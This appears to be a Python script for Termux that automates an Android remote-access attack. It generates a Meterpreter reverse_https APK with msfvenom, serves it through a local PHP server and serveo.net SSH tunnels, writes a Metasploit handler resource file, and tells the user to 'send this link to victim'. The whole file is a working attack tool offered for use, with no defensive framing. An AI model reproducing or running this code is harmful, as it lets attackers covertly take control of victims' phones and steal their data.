import os
import random
import requests
import subprocess
import time
import re
import threading
import sys

R='\033[1;31m'

cycle = ['|', '/', '-', '\\']

string = '[*] Generating payload ..'

list = []

for c in string:
 list.append(c)

port = random.randint(4444, 5555)

for na in os.listdir(str(os.getcwd())):
 if na == 'automate.rc':
  os.remove('automate.rc')

with open('automate.rc', 'w') as f:
 f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveousercontent.com\nset LPORT {port}')
def animate():
 for n in range(len(list)):
  for c in cycle:
   old = list[n]
   list[n] = old.upper()
   final = "".join(list)
   sys.stdout.write('\r')
   sys.stdout.write(f"{final} {c}")
   sys.stdout.flush()
   list[n] = old
   time.sleep(0.1)

def check():
 try:
  requests.get('https://www.google.com', verify=True)
  status = True
 except Exception:
  status = False
 if status == False:
  print(R)
  print('Error : No Internet connection')
  exit()
 else:
  pass

name = input ('[*] Enter APK name: ')
if not name.endswith('.apk'):
 name = f"{name}.apk"
os.system('clear')
subprocess.Popen(["php", "-t", "/data/data/com.termux/files/home/Lemon", "-S", "localhost:4545"])
time.sleep(2)
print('\n[*] PHP Server started\n')

check()

print('\n[*] Forwarding HTTP port..\n')
ser = subprocess.Popen('ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:4545 serveo.net', shell=True, stdout=subprocess.PIPE)
link = ser.stdout.readline()
link = link.decode('utf8')
link = link[34:]
print(f"\nSend this link to victim after starting Handler : {link}/{name}")

time.sleep(7)
print('\n')

def generate():
 generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveousercontent.com LPORT={port} R> $HOME/Lemon/{name}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

gen = threading.Thread(target=generate)
gen.daemon=True
gen.start()

while gen.is_alive():
 animate()

print('\n\n[*] Forwarding TCP port..\n')
subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", f"{port}:localhost:{port}", "serveo.net"])
time.sleep(7)

print("\n\n\nOpen a new session and give command : 'msfconsole -r automate.rc'")

